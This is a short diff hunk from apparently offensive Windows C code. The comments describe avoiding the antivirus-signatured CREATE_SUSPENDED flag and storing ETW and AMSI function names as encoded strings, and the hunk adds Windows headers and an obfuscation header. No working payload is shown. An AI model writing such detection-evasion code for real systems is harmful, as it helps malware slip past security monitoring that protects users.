@@ -9,6 +9,13 @@
  * without CreateProcess — avoiding the heavily signatured CREATE_SUSPENDED flag.
  */
 
+#include <windows.h>
+#include <tlhelp32.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include "obf.h"
+
 /* Encoded strings for ETW/AMSI APIs */
 /* "EtwEventWrite" */
 static unsigned char enc_etweventwrite[] = {
